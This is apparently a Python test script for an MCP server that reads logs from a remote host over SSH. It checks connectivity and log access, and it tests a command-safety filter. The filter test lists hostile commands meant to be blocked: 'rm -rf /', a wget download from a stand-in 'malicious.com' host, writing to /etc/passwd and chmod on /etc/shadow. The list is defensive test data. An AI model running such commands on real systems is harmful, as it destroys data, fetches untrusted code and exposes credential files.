#!/usr/bin/env python3
"""
Test script for Kanakku Logs MCP Server

This script tests the SSH connection and basic log access functionality
without running the full MCP server.
"""

import asyncio
import os
import sys
from pathlib import Path

# Add the current directory to Python path to import the server module
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from kanakku_logs_server import (
    LOG_PATHS,
    execute_remote_command,
    execute_safe_command,
    is_command_safe,
    validate_ssh_config,
)


async def test_ssh_connection():
    """Test basic SSH connectivity."""
    print("🔍 Testing SSH connection...")

    if not validate_ssh_config():
        print("❌ SSH configuration validation failed")
        return False

    stdout, stderr, returncode = await execute_remote_command(
        "echo 'SSH connection test successful'"
    )

    if returncode == 0:
        print("✅ SSH connection successful")
        print(f"   Response: {stdout.strip()}")
        return True
    else:
        print("❌ SSH connection failed")
        print(f"   Error: {stderr}")
        return False


async def test_log_access():
    """Test access to various log files."""
    print("\n🔍 Testing log file access...")

    # Test a few key log files
    test_logs = ["kanakku_app", "nginx_access", "systemd_kanakku", "syslog"]

    results = {}

    for log_key in test_logs:
        print(f"   Testing {log_key}...")

        log_path = LOG_PATHS[log_key]

        if log_path.startswith("journalctl"):
            command = f"{log_path} --no-pager -n 5"
        else:
            command = f"test -r {log_path} && echo 'File accessible' || echo 'File not accessible'"

        stdout, stderr, returncode = await execute_remote_command(command, timeout=10)

        if returncode == 0:
            results[log_key] = "✅ Accessible"
            if "File accessible" in stdout:
                print(f"      ✅ {log_key}: File exists and readable")
            elif stdout.strip():
                print(
                    f"      ✅ {log_key}: Data available ({len(stdout.splitlines())} lines)"
                )
            else:
                print(f"      ⚠️  {log_key}: Accessible but empty")
        else:
            results[log_key] = f"❌ Error: {stderr.strip()}"
            print(f"      ❌ {log_key}: {stderr.strip()}")

    return results


async def test_system_commands():
    """Test system information commands."""
    print("\n🔍 Testing system commands...")

    commands = [
        ("uptime", "System uptime"),
        ("systemctl is-active nginx", "Nginx service status"),
        ("df -h /", "Disk usage"),
        ("free -h", "Memory usage"),
    ]

    for command, description in commands:
        print(f"   Testing: {description}")
        stdout, stderr, returncode = await execute_remote_command(command, timeout=5)

        if returncode == 0:
            print(f"      ✅ {description}: {stdout.strip()}")
        else:
            print(f"      ❌ {description}: {stderr.strip()}")


async def test_command_safety():
    """Test the command safety validation."""
    print("\n🔍 Testing command safety validation...")

    # Test safe commands
    safe_commands = [
        "free -h",
        "df -h",
        "ps aux",
        "systemctl status nginx",
        "uptime",
        "netstat -tlnp",
    ]

    # Test dangerous commands
    dangerous_commands = [
        "rm -rf /",
        "sudo reboot",
        "kill -9 1",
        "wget http://malicious.com/script.sh",
        "echo 'test' > /etc/passwd",
        "chmod 777 /etc/shadow",
    ]

    print("   Testing safe commands:")
    for cmd in safe_commands:
        is_safe, reason = is_command_safe(cmd)
        status = "✅" if is_safe else "❌"
        print(f"      {status} '{cmd}': {reason}")

    print("   Testing dangerous commands (should be blocked):")
    for cmd in dangerous_commands:
        is_safe, reason = is_command_safe(cmd)
        status = "✅ BLOCKED" if not is_safe else "❌ ALLOWED (DANGER!)"
        print(f"      {status} '{cmd}': {reason}")


async def test_safe_command_execution():
    """Test safe command execution."""
    print("\n🔍 Testing safe command execution...")

    test_commands = [
        "uptime",
        "free -h",
        "df -h /",
        "rm -rf /",  # This should be blocked
    ]

    for cmd in test_commands:
        print(f"   Executing: {cmd}")
        stdout, stderr, returncode, safety_note = await execute_safe_command(cmd)

        print(f"      Safety: {safety_note}")
        if returncode == 0 and stdout:
            print(f"      Output: {stdout.strip()[:100]}...")
        elif returncode != 0:
            print(f"      Error: {stderr.strip()[:100]}...")
        print()


async def main():
    """Main test function."""
    print("🚀 Kanakku Logs MCP Server Connection Test")
    print("=" * 50)

    # Check environment variables
    print("📋 Environment Configuration:")
    env_vars = [
        "KANAKKU_DEPLOY_HOST",
        "KANAKKU_DEPLOY_USER",
        "KANAKKU_SSH_KEY_PATH",
        "KANAKKU_SSH_PORT",
    ]

    for var in env_vars:
        value = os.getenv(var, "Not set")
        if var == "KANAKKU_SSH_KEY_PATH" and value != "Not set":
            # Check if key file exists
            key_path = Path(value).expanduser()
            if key_path.exists():
                value += " ✅"
            else:
                value += " ❌ (file not found)"
        print(f"   {var}: {value}")

    print()

    # Test SSH connection
    ssh_ok = await test_ssh_connection()

    if not ssh_ok:
        print("\n❌ SSH connection failed. Please check your configuration.")
        print("\nTroubleshooting steps:")
        print("1. Verify KANAKKU_DEPLOY_HOST is set correctly")
        print("2. Check that SSH key exists and has correct permissions (chmod 600)")
        print("3. Ensure SSH key is added to server's authorized_keys")
        print("4. Test manual SSH connection:")

        host = os.getenv("KANAKKU_DEPLOY_HOST", "your-server")
        user = os.getenv("KANAKKU_DEPLOY_USER", "root")
        key_path = os.getenv("KANAKKU_SSH_KEY_PATH", "~/.ssh/kanakku_deploy")

        print(f"   ssh -i {key_path} {user}@{host}")
        return

    # Test log access
    log_results = await test_log_access()

    # Test system commands
    await test_system_commands()

    # Test command safety validation
    await test_command_safety()

    # Test safe command execution (only if SSH works)
    if ssh_ok:
        await test_safe_command_execution()

    # Summary
    print("\n📊 Test Summary:")
    print("=" * 30)

    accessible_logs = sum(
        1 for result in log_results.values() if result.startswith("✅")
    )
    total_logs = len(log_results)

    print(f"SSH Connection: {'✅ Working' if ssh_ok else '❌ Failed'}")
    print(f"Log Access: {accessible_logs}/{total_logs} logs accessible")

    if accessible_logs == total_logs:
        print("\n🎉 All tests passed! The MCP server should work correctly.")
    elif accessible_logs > 0:
        print("\n⚠️  Some logs are not accessible. The MCP server will work partially.")
        print("   Check server permissions and log file locations.")
    else:
        print("\n❌ No logs accessible. Check server configuration and permissions.")

    print("\nTo start the MCP server:")
    print("   python kanakku_logs_server.py")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n⏹️  Test interrupted by user")
    except Exception as e:
        print(f"\n❌ Test failed with error: {e}")
        sys.exit(1)
